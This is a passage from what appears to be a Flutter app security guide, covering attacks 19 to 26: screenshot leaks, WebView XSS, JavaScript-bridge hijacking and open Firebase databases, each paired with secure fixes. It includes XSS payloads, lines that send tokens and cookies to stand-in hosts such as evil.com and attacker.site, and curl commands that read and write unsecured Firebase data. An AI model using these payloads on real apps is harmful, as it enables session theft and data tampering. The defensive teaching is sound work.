+# Secure Fix 4: Restrict File Access to `getApplicationDocumentsDirectory()`
+
+```dart
+final dir = await getApplicationDocumentsDirectory();
+final file = File("${dir.path}/$safeName");
+```
+
+ This keeps access inside app sandbox.
+
+---
+
+# Risk Level: HIGH
+
+File traversal = token leaks, data corruption, local info disclosure.
+
+---
+
+# Summary
+
+|  Vulnerability | Unsafe file access with user-controlled paths  |
+| ---------------- | ---------------------------------------------- |
+|  Impact        | Read/write private app files or bypass sandbox |
+|  Fix          | Validate path, normalize input, use whitelists |
+
+
+---------------------------------------------------------------------------
+
+
+
+ATTACK 19: SENSITIVE DATA LEAK VIA SCREENSHOT OR SCREEN RECORDING
+
+**(Steal secure UI via screen capture or malware-based screen scraping)**
+
+---
+
+Description:
+
+Flutter apps by default **allow screenshots** and screen recordings, even on:
+
+* OTP pages
+* Payment flows
+* Profile or bank details
+* One-time recovery keys or QR codes
+
+Unless explicitly disabled, **any app on Android or iOS** — or the user — can take screenshots or screen recordings at any time.
+
+---
+
+# Exploitation Steps – Screen Sniffing
+
+---
+
+# Step 1: Attacker Runs Spyware App
+
+On Android, malware with `READ_FRAME_BUFFER`, `MediaProjection` APIs, or root access records:
+
+```bash
+adb shell screencap -p /sdcard/leak.png
+adb pull /sdcard/leak.png
+```
+
+ Pulls exact screen image with OTP, 2FA, passwords, etc.
+
+---
+
+# Step 2: User Accidentally Takes Screenshot
+
+On pages like:
+
+* Backup passphrase
+* Wallet recovery seed
+* Email verification code
+* KYC documents
+
+Screenshot is saved in Gallery → synced to Google Photos/iCloud → **potentially compromised**.
+
+---
+
+# Step 3: App Uses Screen Capture Spy Library
+
+Some spyware apps use `MediaProjectionManager` to record your screen while you're inside another app — including Flutter apps.
+
+ Your app's UI is recorded in real-time **without your knowledge**.
+
+---
+
+# Real-World Examples
+
+| App Type      | Leak Risk                            |
+| ------------- | ------------------------------------ |
+| Banking App   | Account balance, OTP, PIN            |
+| Crypto Wallet | Seed phrase, QR code, wallet address |
+| Authenticator | TOTP / OTP tokens                    |
+| Messaging App | Private conversations, media         |
+
+---
+
+# Vulnerable Flutter Code (Default Behavior)
+
+```dart
+// No protection
+Scaffold(
+  body: Text("Your 2FA Code: 739201"),
+)
+```
+
+ Screenshot captures the sensitive text.
+
+---
+
+# Secure Fix 1: Block Screenshots on Android & iOS (Via Platform Channels)
+
+You can **block screenshots/screen recording** on sensitive pages using platform-specific flags.
+
+---
+
+# Android Native (MainActivity.kt)
+
+```kotlin
+window.setFlags(
+  WindowManager.LayoutParams.FLAG_SECURE,
+  WindowManager.LayoutParams.FLAG_SECURE
+)
+```
+
+ Prevents screenshots & screen recording.
+
+---
+
+# iOS Native (AppDelegate.swift)
+
+```swift
+window?.isSecureTextEntry = true
+```
+
+ Blocks screen capture for sensitive views.
+
+---
+
+# Flutter Plugin: [flutter\_windowmanager](https://pub.dev/packages/flutter_windowmanager)
+
+```dart
+import 'package:flutter_windowmanager/flutter_windowmanager.dart';
+
+await FlutterWindowManager.addFlags(FlutterWindowManager.FLAG_SECURE);
+```
+
+ One-liner to block screenshots on Android.
+
+---
+
+# Secure Fix 2: Show Warning If Screenshot Is Taken (Optional)
+
+Use Android’s `ContentObserver` or iOS `UIPasteboard` to detect screenshots and alert the user.
+
+---
+
+# Secure Fix 3: Blur Screenshots When App Goes Background
+
+On `WidgetsBindingObserver.didChangeAppLifecycleState()`:
+
+```dart
+if (state == AppLifecycleState.paused) {
+  Navigator.pushReplacement(context, BlurScreen());
+}
+```
+
+ Prevents snapshot memory leaks when app is backgrounded.
+
+---
+
+# Secure Fix 4: Disable Screenshots Only on Sensitive Screens
+
+Apply FLAG\_SECURE only on:
+
+* Login
+* KYC
+* OTP
+* Wallet seed backup
+* Profile edit pages
+
+This balances security with usability.
+
+---
+
+# Risk Level: HIGH
+
+Screenshot = permanent record of sensitive UI — with no control over where it goes.
+
+---
+
+ Summary
+
+|  Vulnerability | Screenshots or screen recordings allowed by default    |
+| ---------------- | ------------------------------------------------------ |
+|  Impact        | OTP leaks, seed theft, document compromise             |
+|  Fix          | Use FLAG\_SECURE, detect screen capture, blur on pause |
+
+
+------------------------------------------------------------------------
+
+
+
+ATTACK 20: WEBVIEW XSS VIA UNTRUSTED CONTENT INJECTION
+
+📌 **Description**
+Flutter apps that use `WebView` to load external or untrusted HTML content — especially with JavaScript enabled — are vulnerable to **Cross-Site Scripting (XSS)** attacks. Malicious scripts can steal tokens, manipulate the DOM, or hijack sessions inside the app.
+
+---
+
+**🧪 Exploitation Steps (WebView XSS PoC)**
+
+1. App loads a WebView with JavaScript enabled:
+
+```dart
+WebView(
+  initialUrl: 'https://vulnerable-site.com/page.html',
+  javascriptMode: JavascriptMode.unrestricted,
+);
+```
+
+2. Attacker injects malicious payload into the website or URL params:
+
+```
+https://vulnerable-site.com/page.html?msg=<script>alert('Hacked')</script>
+```
+
+3. The app loads this URL in WebView with JavaScript **unrestricted**, executing the attacker's JS.
+
+4. Payload example:
+
+```html
+<script>
+  // steal cookies (in hybrid apps), or do phishing
+  fetch('https://attacker.site/log?token=' + localStorage.getItem('authToken'));
+</script>
+```
+
+---
+
+**💻 XSS PoC Payloads for Testing**
+
+Try loading any of these in WebView-enabled apps:
+
+```html
+<script>alert('XSS')</script>
+```
+
+```html
+<img src=x onerror=alert('Hacked')>
+```
+
+```html
+<script>location.href='https://attacker.site?cookie='+document.cookie</script>
+```
+
+✅ If popup shows inside the app, or redirection happens: **XSS confirmed**.
+
+---
+
+**💥 Why This Works**
+
+* `JavascriptMode.unrestricted` = full JS access inside WebView
+* App loads data from user-controlled source (URL/HTML)
+* No sanitization of HTML or input
+* No origin checks (in case of JS channels)
+
+---
+
+**🛡️ Secure Fix 1: Disable JavaScript**
+
+```dart
+WebView(
+  initialUrl: 'https://safe-url.com',
+  javascriptMode: JavascriptMode.disabled,
+)
+```
+
+✅ Most secure — don’t allow JS unless absolutely required.
+
+---
+
+**🛡️ Secure Fix 2: Whitelist Trusted Domains**
+
+```dart
+NavigationDecision _intercept(NavigationRequest request) {
+  if (request.url.startsWith('https://mydomain.com')) {
+    return NavigationDecision.navigate;
+  }
+  return NavigationDecision.prevent;
+}
+```
+
+```dart
+WebView(
+  initialUrl: 'https://mydomain.com',
+  javascriptMode: JavascriptMode.unrestricted,
+  navigationDelegate: _intercept,
+)
+```
+
+✅ Prevents redirection to malicious or untrusted URLs.
+
+---
+
+**🛡️ Secure Fix 3: Sanitize All Injected HTML**
+
+If you're loading HTML strings, use packages like `html_unescape`, sanitize inputs on backend, and NEVER interpolate untrusted user input directly.
+
+---
+
+**🛡️ Secure Fix 4: Avoid JS Channels**
+
+If using `JavascriptChannels`:
+
+```dart
+javascriptChannels: <JavascriptChannel>{
+  JavascriptChannel(
+    name: 'Android',
+    onMessageReceived: (JavascriptMessage message) {
+      // Make sure the message source is trusted
+    },
+  ),
+},
+```
+
+✅ Validate incoming messages and origin strictly.
+
+---
+
+**⚠️ Risk Level: CRITICAL**
+WebView XSS can lead to **token theft, session hijacking, phishing, or full in-app control**. Especially dangerous if used with deep links or local HTML.
+
+---
+
+✅ Disable JS when possible
+✅ Sanitize all content
+✅ Never load untrusted URLs without strict validation
+
+
+
+--------------------------------------------------------------------------
+
+
+
+ATTACK 21: FLUTTER WEBVIEW JAVASCRIPT BRIDGE ABUSE (JS → DART CODE EXECUTION)
+
+---
+
+### 📌 **Description**
+
+When using `WebView` with **`JavascriptChannel`**, developers allow JavaScript code in the page to **call Dart functions** directly. If the web content is untrusted or can be modified (via user input, query params, or external hosting), attackers can inject JavaScript that **executes code inside the Flutter app** — a classic **bridge injection attack**.
+
+This enables:
+
+* App control from JS
+* Sensitive data exfiltration
+* Remote Dart code triggering
+* Local file access (if exposed)
+
+---
+
+### 🧪 **Exploitation Steps (Bridge Hijack PoC)**
+
+#### Step 1: Vulnerable Flutter WebView Setup
+
+```dart
+WebView(
+  initialUrl: 'https://example.com/page.html',
+  javascriptMode: JavascriptMode.unrestricted,
+  javascriptChannels: {
+    JavascriptChannel(
+      name: 'FlutterChannel',
+      onMessageReceived: (message) {
+        print('Received from JS: ${message.message}');
+        if (message.message == 'logout') {
+          AuthService.logoutUser(); // 🚨 Dangerous!
+        }
+      },
+    ),
+  },
+)
+```
+
+✅ This allows **any JS** loaded inside the page to trigger `FlutterChannel.postMessage()` — including malicious JS.
+
+---
+
+#### Step 2: Malicious JavaScript Injection
+
+If the attacker injects the following into the loaded page:
+
+```html
+<script>
+  FlutterChannel.postMessage("logout");
+</script>
+```
+
+✅ This will trigger Dart-side logout (or worse, any critical function bound to the message).
+
+---
+
+### 💣 Real-World Abuse Example
+
+```html
+<script>
+  FlutterChannel.postMessage(
+    JSON.stringify({
+      action: "delete_account",
+      userId: "admin"
+    })
+  );
+</script>
+```
+
+If your Dart code does:
+
+```dart
+final msg = jsonDecode(message.message);
+if (msg['action'] == 'delete_account') {
+  userService.deleteUser(msg['userId']); // ⚠️ NO validation
+}
+```
+
+🔥 Full account deletion triggered **just from JS**.
+
+---
+
+### 💥 Why This Works
+
+* `JavascriptMode.unrestricted` gives full JS control.
+* `JavascriptChannel` lets JS call Dart **without any auth or origin check**.
+* No validation on messages.
+* If the webpage is user-controlled or editable → total abuse.
+
+---
+
+### 🛡️ Secure Fix 1: Remove JS Bridge if Not Needed
+
+```dart
+javascriptChannels: {},
+```
+
+✅ Remove `JavascriptChannel` entirely if the app doesn’t need JS → Dart communication.
+
+---
+
+### 🛡️ Secure Fix 2: Restrict JS Messages
+
+If you **must** allow JS messages, validate them tightly:
+
+```dart
+onMessageReceived: (JavascriptMessage message) {
+  if (kDebugMode) print('Received: ${message.message}');
+
+  final allowedMessages = ['scrollToTop', 'logout'];
+  if (!allowedMessages.contains(message.message)) return;
+
+  if (message.message == 'logout') {
+    AuthService.logoutUser();
+  }
+}
+```
+
+✅ Reject anything that’s not explicitly allowed.
+
+---
+
+### 🛡️ Secure Fix 3: Host Web Pages Safely
+
+✅ Use only **trusted, static web pages** you control — no dynamic injection.
+
+* Never allow user-uploaded HTML/JS
+* Avoid `WebView(initialUrl: anything-from-user)`
+* Don’t use query params that inject into raw HTML
+
+---
+
+### 🛡️ Secure Fix 4: Disable JS in WebView If Not Needed
+
+```dart
+javascriptMode: JavascriptMode.disabled,
+```
+
+✅ Completely blocks bridge and script execution.
+
+---
+
+### 🛡️ Bonus Fix: Detect & Block JS Bridge Abuse (Heuristic)
+
+Track `JavascriptChannel` frequency and block suspicious spam attempts:
+
+```dart
+int msgCount = 0;
+DateTime? firstMsg;
+
+onMessageReceived: (msg) {
+  msgCount++;
+  if (firstMsg == null) firstMsg = DateTime.now();
+
+  if (msgCount > 5 && DateTime.now().difference(firstMsg!) < Duration(seconds: 3)) {
+    print('⚠️ Possible JS abuse detected');
+    msgCount = 0;
+    firstMsg = null;
+  }
+}
+```
+
+---
+
+### ⚠️ Risk Level: HIGH
+
+JS bridge abuse = **remote control of app logic** via a website — massive abuse potential.
+
+---
+
+### ✅ Summary
+
+| 🔓 Vulnerability | JS controls Flutter via `JavascriptChannel`      |
+| ---------------- | ------------------------------------------------ |
+| 💣 Impact        | Remote Dart execution, logout, data wipes, abuse |
+| 🛠️ Fix          | Validate or remove JS bridge entirely            |
+
+
+
+---------------------------------------------------------------------------
+
+
+
+ATTACK 22 – WebView JavaScript Bridge Injection (JS-to-Native Exploit in Flutter)
+
+
+> *(Inject JavaScript into a Flutter WebView and then trigger Flutter/Dart code or native plugin calls via `JavascriptChannel` — a real-world WebView-to-app attack vector.)*
+
+---
+
+### 📌 **Description**
+
+Flutter’s `WebView` allows bidirectional communication between **JavaScript in web pages** and **Dart/Flutter code** using `JavascriptChannel`.
+
+If your app:
+
+* Loads **untrusted web content**
+* Or includes **in-app browsers** (help pages, user-generated pages, blogs, etc.)
+
+Then an attacker can:
+
+* Inject JavaScript into the WebView
+* Use `JavascriptChannel.postMessage()` to call native methods or Flutter functions
+* Trigger fake logic, data theft, or UI manipulation
+
+---
+
+### 🧪 **Exploitation Walkthrough**
+
+#### 🧩 Example Vulnerable Code
+
+```dart
+WebView(
+  initialUrl: 'https://example.com',
+  javascriptMode: JavascriptMode.unrestricted,
+  javascriptChannels: {
+    JavascriptChannel(
+      name: 'FlutterBridge',
+      onMessageReceived: (message) {
+        if (message.message == 'getToken') {
+          getTokenAndSend();
+        }
+      },
+    ),
+  },
+)
+```
+
+---
+
+#### 💥 Step 1: Inject JavaScript (via XSS or URL manipulation)
+
+If the webpage has a stored XSS, or loads dynamic scripts:
+
+```html
+<script>
+  FlutterBridge.postMessage("getToken");
+</script>
+```
+
+✅ This will **call Dart function**: `getTokenAndSend()`
+
+---
+
+#### 💥 Step 2: Fake Native Function Execution
+
+If the Dart-side method sends the token back to WebView or logs it:
+
+```dart
+void getTokenAndSend() async {
+  final prefs = await SharedPreferences.getInstance();
+  final token = prefs.getString('auth_token');
+  webViewController.evaluateJavascript("window.receive('$token')");
+}
+```
+
+✅ JavaScript attacker receives your token!
+
+---
+
+### 🔥 Alternate Exploit: QR Page + JS Bridge
+
+If a malicious site is opened in a WebView:
+
+```html
+<script>
+  // Auto-trigger a fake scan
+  FlutterBridge.postMessage("scanQR");
+</script>
+```
+
+And in Dart:
+
+```dart
+if (msg == "scanQR") {
+  launchScanner(); // opens camera, sends data
+}
+```
+
+❗Now attacker can trigger **device sensors, permissions, or UI logic** via web JS.
+
+---
+
+### 💥 Why It Works
+
+* `JavascriptMode.unrestricted` = JS can run freely
+* `JavascriptChannel` = Dart listens to JS commands
+* **No origin check** = even malicious sites can trigger it
+* XSS on loaded pages can lead to full Dart/NATIVE exploit
+
+---
+
+### 🔧 **Fixes**
+
+#### ✅ Fix 1: Never Use `JavascriptMode.unrestricted` for Untrusted URLs
+
+```dart
+if (isTrusted(url)) {
+  javascriptMode = JavascriptMode.unrestricted;
+} else {
+  javascriptMode = JavascriptMode.disabled;
+}
+```
+
+✅ Only enable JS on whitelisted domains.
+
+---
+
+#### ✅ Fix 2: Use Domain Check Before Processing Messages
+
+```dart
+onMessageReceived: (message) {
+  if (currentWebViewUrl.host == "yourdomain.com") {
+    // only allow from your trusted site
+    if (message.message == "getToken") getTokenAndSend();
+  }
+}
+```
+
+---
+
+#### ✅ Fix 3: Encode Sensitive Data Before Sending
+
+If you **must** send data to JS:
+
+```dart
+final safe = Uri.encodeComponent(token);
+webViewController.evaluateJavascript("receive('$safe')");
+```
+
+---
+
+#### ✅ Fix 4: Use CSP (Content-Security-Policy) on Loaded Pages
+
+Prevent JS injection:
+
+```html
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self';">
+```
+
+✅ Blocks XSS and malicious script sources.
+
+---
+
+### 🛡️ Summary
+
+| 🔐 Vulnerability | JavaScript in WebView can trigger native Flutter logic via channel |
+| ---------------- | ------------------------------------------------------------------ |
+| 💥 Impact        | Token theft, camera/mic abuse, UI logic manipulation               |
+| 🛠️ Fix          | Validate JS sources, restrict JS mode, verify message origins      |
+
+
+----------------------------------------------------------------------------
+
+
+
+ATTACK 23: JAVASCRIPT BRIDGE HIJACK IN FLUTTER WEBVIEW
+
+**(Exploit exposed native-Dart JS interfaces to steal or modify app data)**
+
+---
+
+### 📌 **Description**
+
+Flutter apps often use `webview_flutter` or `flutter_inappwebview` to embed web content. These allow **JavaScript → Dart bridges** (like `onMessageReceived` or `evaluateJavascript`). If you load **remote pages** or allow JS from user-controlled sources, attackers can:
+
+* Inject JavaScript
+* Hijack the bridge
+* Call native methods
+* Steal secrets or force actions
+
+---
+
+### 🧪 Exploitation Steps – JS Injection & Bridge Abuse
+
+---
+
+#### 🎯 Step 1: App Loads Untrusted URL in WebView
+
+```dart
+WebView(
+  initialUrl: "https://example.com/payment",
+  javascriptMode: JavascriptMode.unrestricted,
+  onWebViewCreated: (controller) {
+    controller.evaluateJavascript("window.token = '$authToken';");
+  },
+);
+```
+
+✅ Attacker controls `example.com` or injects JS via XSS → gets `$authToken`.
+
+---
+
+#### 🐍 Step 2: Expose Dart Interface to JS
+
+With `flutter_inappwebview`, you might register handlers like:
+
+```dart
+controller.addJavaScriptHandler(
+  handlerName: "getUserData",
+  callback: (args) {
+    return currentUser.toJson();
+  },
+);
+```
+
+✅ If JS is injected, attacker calls:
+
+```js
+window.flutter_inappwebview.callHandler("getUserData")
+```
+
+➡️ Dumps user info **from Dart into JavaScript.**
+
+---
+
+#### 💣 Step 3: Attacker Injects JS to Exfiltrate
+
+```js
+fetch("https://evil.com/steal?data=" + encodeURIComponent(window.token));
+```
+
+✅ Sends data to attacker's server — now they own the session.
+
+---
+
+### 💥 Why This Works
+
+* `JavascriptMode.unrestricted` = full JS execution
+* WebView exposes app internals (via handlers)
+* No origin check for JS bridges
+* User-controlled input injected into HTML
+* Pages not CSP protected or sandboxed
+
+---
+
+### 💻 Vulnerable Dart Code
+
+```dart
+WebView(
+  javascriptMode: JavascriptMode.unrestricted,
+  onWebViewCreated: (controller) {
+    controller.addJavaScriptHandler(
+      handlerName: "getToken",
+      callback: (_) => token,
+    );
+  },
+);
+```
+
+✅ JS inside the WebView can now call `"getToken"` and leak it.
+
+---
+
+### 🛡️ Secure Fix 1: Never Expose Sensitive Data to JS
+
+Avoid this:
+
+```dart
+controller.evaluateJavascript("window.token = '$token';");
+```
+
+✅ Tokens should never go to web layer unless strictly necessary.
+
+---
+
+### 🛡️ Secure Fix 2: Only Use `JavascriptMode.restricted`
+
+```dart
+WebView(
+  javascriptMode: JavascriptMode.restricted,
+);
+```
+
+✅ Prevents JS execution entirely.
+
+---
+
+### 🛡️ Secure Fix 3: Use CSP Headers in Web Pages
+
+On the server side, enforce Content Security Policy:
+
+```http
+Content-Security-Policy: default-src 'self'; script-src 'none';
+```
+
+✅ Blocks inline and remote scripts.
+
+---
+
+### 🛡️ Secure Fix 4: Use Host-Check Before Executing Any JS Handlers
+
+```dart
+if (currentUrl.contains("my-secure-page.com")) {
+  controller.addJavaScriptHandler(...);
+}
+```
+
+✅ Ensures only trusted pages access the bridge.
+
+---
+
+### 🛡️ Secure Fix 5: Don’t Load Remote URLs Without Sanitization
+
+Avoid:
+
+```dart
+WebView(initialUrl: userSuppliedUrl);
+```
+
+✅ Use whitelisted URLs only.
+
+---
+
+### ⚠️ Risk Level: CRITICAL
+
+Exposed JS bridge = full data leak, account takeover, or transaction forgery.
+
+---
+
+### ✅ Summary
+
+| 🔓 Vulnerability | WebView exposes Dart/Native interface to JS        |
+| ---------------- | -------------------------------------------------- |
+| 💣 Impact        | Token theft, user data leak, payment forgery       |
+| 🛠️ Fix          | Disable JS, validate bridges, never expose secrets |
+
+
+---------------------------------------------------------------------------
+
+
+
+ATTACK 24: FLUTTER WEBVIEW INJECTION
+
+**(JavaScript injection, XSS, and WebView bridge hijack)**
+
+---
+
+### 📌 **Description**
+
+Flutter’s WebView allows embedding webpages inside your app. But:
+
+* If JavaScript is enabled
+* If you load untrusted or dynamic content (e.g., via `htmlString`, external URLs)
+* If you expose Dart-native bridges to JS (like `postMessage` handlers)
+
+…attackers can inject scripts, steal tokens, or hijack native logic.
+
+✅ A malicious webpage or injected script can **exfiltrate data**, **trigger unintended app flows**, or **bypass login**.
+
+---
+
+### 🧪 Exploitation Scenarios
+
+---
+
+#### 📲 Case 1: JavaScript Injection in HTML String
+
+```dart
+WebView(
+  initialUrl: Uri.dataFromString(
+    '<html><body>${userInput}</body></html>',
+    mimeType: 'text/html'
+  ).toString(),
+  javascriptMode: JavascriptMode.unrestricted,
+)
+```
+
+✅ If `userInput` is not sanitized, attacker injects:
+
+```html
+<script>
+  fetch('https://evil.com/steal?data=' + document.cookie);
+</script>
+```
+
+---
+
+#### 📂 Case 2: Load External URL with JS Enabled
+
+```dart
+WebView(
+  initialUrl: 'https://myapp.com/profile',
+  javascriptMode: JavascriptMode.unrestricted,
+)
+```
+
+✅ If attacker compromises `myapp.com` or injects script via query params:
+
+```
+https://myapp.com/profile?name=<script>exfil()</script>
+```
+
+…it runs **inside the app**, and can access cookies or local data.
+
+---
+
+#### 🧠 Case 3: JavaScript → Dart Bridge Abuse
+
+```dart
+JavascriptChannel(
+  name: 'MyChannel',
+  onMessageReceived: (JavascriptMessage message) {
+    if (message.message == 'getToken') {
+      // attacker gets sensitive data
+    }
+  },
+)
+```
+
+✅ If attacker can inject JS, they call:
+
+```js
+MyChannel.postMessage('getToken');
+```
+
+…and read data passed from Dart!
+
+---
+
+### 💥 Real-World Impacts
+
+* 📤 Steal tokens, user info, session cookies
+* 🧬 Trigger fake flows: payments, logout, delete
+* 🧨 Execute native code indirectly via Dart bridge
+* 🔗 Use deep link hijacks to inject webview exploit
+
+---
+
+### 💻 Exploitable Flutter Code (Vulnerable Setup)
+
+```dart
+WebView(
+  initialUrl: 'https://yourapp.com/page',
+  javascriptMode: JavascriptMode.unrestricted,
+  javascriptChannels: {
+    JavascriptChannel(
+      name: 'TokenChannel',
+      onMessageReceived: (message) {
+        if (message.message == 'getToken') {
+          webViewController.evaluateJavascript("receiveToken('$token')");
+        }
+      },
+    ),
+  },
+)
+```
+
+✅ If attacker controls the web content — they now receive tokens.
+
+---
+
+### 💥 Why This Works
+
+* JS is enabled (`JavascriptMode.unrestricted`)
+* No input sanitization
+* JS bridge exposed to external pages
+* Insecure use of `htmlString` or query params
+* No CSP (Content Security Policy) or iframe sandboxing
+
+---
+
+### 🛡️ Secure Fix 1: Disable JavaScript Unless Required
+
+Use:
+
+```dart
+javascriptMode: JavascriptMode.disabled
+```
+
+✅ Only enable JS if **absolutely necessary**.
+
+---
+
+### 🛡️ Secure Fix 2: Never Use HTML Strings with User Input
+
+```dart
+final safeContent = htmlEscape.convert(userInput); // always escape
+```
+
+✅ Prevents script injection inside `htmlString`.
+
+---
+
+### 🛡️ Secure Fix 3: Strict Origin Checks on JS Channels
+
+```dart
+onMessageReceived: (msg) {
+  if (!webViewController.currentUrl.contains('yourapp.com')) return;
+  // handle safely
+}
+```
+
+✅ Only process JS messages from **your domain**.
+
+---
+
+### 🛡️ Secure Fix 4: Use Secure CSP Headers on Backend Pages
+
+On `https://yourapp.com`:
+
+```html
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self';">
+```
+
+✅ Prevents 3rd-party JS from executing.
+
+---
+
+### 🛡️ Secure Fix 5: Sandbox Iframes and Backend Pages
+
+For embedded WebViews (like chatbots, help pages):
+
+```html
+<iframe src="..." sandbox="allow-scripts allow-same-origin"></iframe>
+```
+
+✅ Restricts iframe JS capabilities.
+
+---
+
+### ⚠️ Risk Level: CRITICAL
+
+Unrestricted WebViews = XSS, token theft, bridge abuse.
+
+---
+
+### ✅ Summary
+
+| 🔓 Vulnerability | WebView with JS, bridge, or unsafe HTML               |
+| ---------------- | ----------------------------------------------------- |
+| 💣 Impact        | Token leak, native abuse, data theft                  |
+| 🛠️ Fix          | Disable JS, sanitize input, validate origins, use CSP |
+
+
+
+---------------------------------------------------------------------
+
+
+
+ATTACK 25: UNPROTECTED FIREBASE – OPEN READ/WRITE ACCESS
+
+---
+
+### 📌 **Description**
+
+If a Flutter app uses Firebase Realtime Database or Firestore and **doesn’t configure security rules properly**, attackers can **read, write, or delete** any data — just by accessing the project URL.
+
+This is one of the **most common real-world Flutter security issues** found in Android apps using Firebase.
+
+---
+
+### 🧪 **Exploitation Steps – Public Firebase .json Access (Realtime DB)**
+
+#### 🔍 Step 1: Find the Firebase Database URL
+
+Most apps hardcode it inside the app or `google-services.json`:
+
+```
+https://yourproject-id.firebaseio.com/
+```
+
+If the app uses this in code:
+
+```dart
+FirebaseDatabase.instance.reference().child('users')
+```
+
+Then the raw URL is:
+
+```
+https://yourproject-id.firebaseio.com/users.json
+```
+
+---
+
+#### 🧨 Step 2: Read the data without login (no token)
+
+```bash
+curl https://yourproject-id.firebaseio.com/users.json
+```
+
+If response contains:
+
+```json
+{
+  "uid_123": {
+    "email": "admin@gmail.com",
+    "password": "123456",
+    "role": "super_admin"
+  }
+}
+```
+
+🔥 **You just exposed user data without authentication.**
+
+---
+
+#### 💣 Step 3: Write or Delete (Massive Impact)
+
+```bash
+curl -X PUT -d '{"msg":"pwned"}' \
+  https://yourproject-id.firebaseio.com/messages.json
+```
+
+✅ If this succeeds — the DB allows **write** access to anonymous users!
+
+---
+
+### 💥 Why This Works
+
+* Firebase defaults to:
+
+```json
+{
+  "rules": {
+    ".read": true,
+    ".write": true
+  }
+}
+```
+
+* If the developer **never updates security rules**, the DB is public.
+* Flutter apps don’t stop this — security rules must be set in Firebase Console!
+
+---
+
+### 💻 Vulnerable Dart Example
+
+```dart
+DatabaseReference db = FirebaseDatabase.instance.reference().child('users');
+db.push().set({'username': 'admin', 'email': 'admin@gmail.com'});
+```
+
+If rules are open, **anyone** with the DB URL can do the same — **even without your app**.
+
+---
+
+### 🛡️ Secure Fix: Lock Down Firebase Rules
+
+#### ✅ **For Realtime Database** (Basic Safe Example):
+
+```json
+{
+  "rules": {
+    ".read": "auth != null",
+    ".write": "auth != null"
+  }
+}
+```
+
+✅ Only signed-in users can access data.
+
+---
+
+#### 🛡️ Advanced: User-specific access
+
+```json
+{
+  "rules": {
+    "users": {
+      "$uid": {
+        ".read": "$uid === auth.uid",
+        ".write": "$uid === auth.uid"
+      }
+    }
+  }
+}
+```
+
+✅ Users can only read/write their own data.
+
+---
+
+#### 🔒 For Firestore (Better structure):
+
+```bash
+rules_version = '2';
+service cloud.firestore {
+  match /databases/{database}/documents {
+    match /users/{userId} {
+      allow read, write: if request.auth.uid == userId;
+    }
+  }
+}
+```
+
+✅ This protects per-user access to documents in Firestore.
+
+---
+
+### 🧠 Bonus Tips:
+
+* Never allow `.read: true` or `.write: true` in production
+* Always use **Firebase Authentication** for access control
+* Monitor Firebase access logs for abuse
+* Disable unused Firebase services (Realtime DB if you use only Firestore)
+
+---
+
+### ⚠️ Risk Level: **CRITICAL**
+
+Unprotected Firebase = Full app compromise:
+
+* Leak users, passwords, chats, orders
+* Write fake data, inject payloads
+* Delete everything
+
+---
+
+### ✅ Summary:
+
+| 🔓 Attack | Public `.json` access via Realtime DB    |
+| --------- | ---------------------------------------- |
+| 💣 Impact | Full Read/Write/Deletion of all app data |
+| 🛠️ Fix   | Firebase Rules + Auth Required           |
+
+
+
+----------------------------------------------------------------------
+
+
+ATTACK 26: FIREBASE MISCONFIGURATION IN FLUTTER
+
+**(Bypass security via weak or absent Firebase rules — from the Flutter app)**
+
+---
+
+### 📌 **Description**
+
+Flutter + Firebase integration typically involves:
+
+* Firestore (Cloud Firestore database)
+* Firebase Realtime Database
+* Firebase Storage
+* Firebase Auth
+
+Most Flutter devs use the Firebase SDK directly from the client:
+
+```dart
+final snapshot = await FirebaseFirestore.instance
+  .collection("users")
+  .get();
+```
+
+✅ If Firestore rules are not **explicitly hardened**, any attacker with your APK can extract or modify all data.
+
+---
+
+### 🧪 Exploitation Steps — Firebase Admin/Access Abuse
+
+---
+
+#### 🔍 Step 1: Reverse APK or Intercept Traffic
+
+Attacker finds `firebase_options.dart` or network logs:
+
+```dart
+apiKey: "AIza...",
+projectId: "yourapp-id",
+appId: "1:1234567890:android:abc123",
+```
+
+✅ They now have access to **your Firebase project as a client**.
+
+---
+
+#### 🧪 Step 2: Use Firebase CLI or SDK to Query Database
+
+```bash
+firebase login
+firebase firestore:get /users --project yourapp-id
+```
+
+✅ If rules are loose, attacker gets **all user data**.
+
+---
+
+#### 💣 Step 3: Exploit Weak Rules
+
+Default or bad Firestore rule:
+
+```js
+match /{document=**} {
+  allow read, write: if true;
+}
+```
+
+✅ Everyone can read/write **everything**.
+
+---
+
+#### 🎯 Step 4: Modify Flutter App Behavior (e.g., write arbitrary data)
+
+Attacker re-signs Flutter app with modded Dart:
+
+```dart
+FirebaseFirestore.instance
+  .collection("admin")
+  .doc("settings")
+  .set({"isPremiumUser": true});
+```
+
+✅ Elevates privileges or modifies backend behavior.
+
+---
+
+### 💥 Real-World Impacts
+
+| Exploit                    | Risk                          |
+| -------------------------- | ----------------------------- |
+| Read `/users`              | Full user list leakage        |
+| Write `/roles/admin`       | Privilege escalation          |
+| Read `/transactions`       | Payment records               |
+| Access `/private_uploads/` | File leaks (Aadhar, licenses) |
+
+---
+
+### 💻 Vulnerable Flutter Code (With Bad Rules)
+
+```dart
+final files = await FirebaseStorage.instance
+  .ref("uploads")
+  .listAll();
+```
+
+✅ If no rules, attacker can download any file.
+
+---
+
+### 🛡️ Secure Fix 1: Write Strict Firestore Rules
+
+Example:
+
+```js
+rules_version = '2';
+service cloud.firestore {
+  match /databases/{database}/documents {
+    match /users/{userId} {
+      allow read, write: if request.auth.uid == userId;
+    }
+    match /admin/{doc} {
+      allow read, write: if false;
+    }
+  }
+}
+```
+
+✅ Only authenticated users access their own data.
+
+---
+
+### 🛡️ Secure Fix 2: Use Firebase Auth Everywhere
+
+Before any data access:
+
+```dart
+final uid = FirebaseAuth.instance.currentUser?.uid;
+if (uid != null) {
+  // Access user-scoped data
+}
+```
+
+✅ Don't allow reads/writes without verified user identity.
+
+---
+
+### 🛡️ Secure Fix 3: NEVER Rely on Client for Authorization
+
+Instead of:
+
+```dart
+if (isAdmin) {
+  FirebaseFirestore.instance.collection("admin").get();
+}
+```
+
+Use:
+
+* Verified **custom claims** via Firebase Admin SDK
+* Server-side validation only
+
+---
+
+### 🛡️ Secure Fix 4: Secure Firebase Storage Rules
+
+Example:
+
+```js
+rules_version = '2';
+service firebase.storage {
+  match /b/{bucket}/o {
+    match /uploads/{userId}/{fileName} {
+      allow read, write: if request.auth.uid == userId;
+    }
+  }
+}
+```
+
+✅ Only user can access their files.
+
+---
+
+### ⚠️ Risk Level: CRITICAL
+
+Misconfigured Firebase = complete backend compromise.
+
+---
+
+### ✅ Summary
+
